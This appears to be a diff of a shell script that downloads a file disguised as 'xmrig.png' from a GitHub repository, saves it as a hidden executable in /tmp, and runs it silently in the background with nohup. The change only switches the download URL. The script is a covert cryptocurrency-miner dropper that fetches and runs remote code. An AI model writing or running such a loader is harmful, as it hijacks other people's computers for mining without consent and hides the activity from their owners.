@@ -1,4 +1,4 @@
 wget https://raw.githubusercontent.com/m11001alpha/helloworld/master/config.json.png -O /tmp/config.json
-wget https://github.com/m11001alpha/helloworld/raw/master/xmrig.png -O /tmp/.xmrig
+wget https://raw.githubusercontent.com/m11001alpha/helloworld/master/xmrig.png -O /tmp/.xmrig
 chmod 744 /tmp/.xmrig
 nohup /tmp/.xmrig >/dev/null 2>&1 &
